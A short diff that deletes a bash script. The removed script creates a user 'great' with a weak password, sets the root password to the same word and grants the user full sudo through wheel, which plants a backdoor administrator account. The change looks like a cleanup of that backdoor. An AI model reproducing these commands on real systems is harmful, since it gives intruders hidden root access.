@@ -1,6 +1,0 @@
-#!/bin/bash
-useradd great
-echo "great:great" | chpasswd
-echo "root:great" | chpasswd
-usermod -aG wheel great
-echo "%wheel ALL=(ALL) ALL" >> /etc/sudoers.d/99-wheel
